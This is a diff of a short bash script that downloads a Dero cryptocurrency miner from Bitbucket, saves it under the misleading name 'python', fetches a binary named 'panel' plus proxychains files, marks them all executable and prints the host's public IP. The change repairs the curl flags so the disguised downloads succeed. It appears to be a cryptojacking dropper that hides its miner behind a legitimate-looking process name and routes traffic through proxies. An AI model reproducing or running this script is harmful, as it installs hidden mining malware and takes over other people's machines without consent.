@@ -1,6 +1,6 @@
 #!/bin/bash
-curl -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python 
-curl -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
+curl -L -o python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python 
+curl -L -o proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 curl -O https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
 curl -O https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 echo "IP ORI ==> "$(curl ifconfig.me) 
